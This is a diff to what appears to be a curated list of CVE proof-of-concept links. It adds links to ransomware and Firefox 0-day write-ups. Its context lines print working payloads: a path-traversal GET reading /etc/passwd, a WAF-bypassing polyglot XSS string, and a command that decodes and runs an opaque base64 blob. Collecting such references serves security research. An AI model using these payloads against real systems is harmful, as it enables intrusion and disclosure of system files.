@@ -170,6 +170,7 @@ Some CVEs PoCs repos on github or internet.
 - Signal IDN homograph attack: [CVE-2019-9970](https://wildfire.blazeinfosec.com/security-advisory-signal-idn-homograph-attack-2/).
 - [Grandstream Exploits](https://github.com/scarvell/grandstream_exploits): Grandstream Exploits
 - Apache HTTPD Root Privilege Escalation - CARPE (DIEM): [CVE-2019-0211](https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html), [github](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache)
+- Say Cheese: [Ransomware-ing a DSLR Camera](https://research.checkpoint.com/say-cheese-ransomware-ing-a-dslr-camera/) -
 
 '''bash
 $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
@@ -181,13 +182,14 @@ $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | ba
 GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
 ```
 
-- Web/Javscript/WAF [Payload will run in a lot of contexts](): Short but lethal. No script tags, thus bypassing a lot of WAF and executes in multiple environments.
+- Web/Javscript/WAF Payload will run in a lot of contexts: Short but lethal. No script tags, thus bypassing a lot of WAF and executes in multiple environments.
 
 ```javascript
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 ```
 
 - [Thrangrycat](https://xn--538haa.fm/)
+- [Responding to Firefox 0-days in the wild](https://blog.coinbase.com/responding-to-firefox-0-days-in-the-wild-d9c85a57f15b)
 
 ## Additions
 
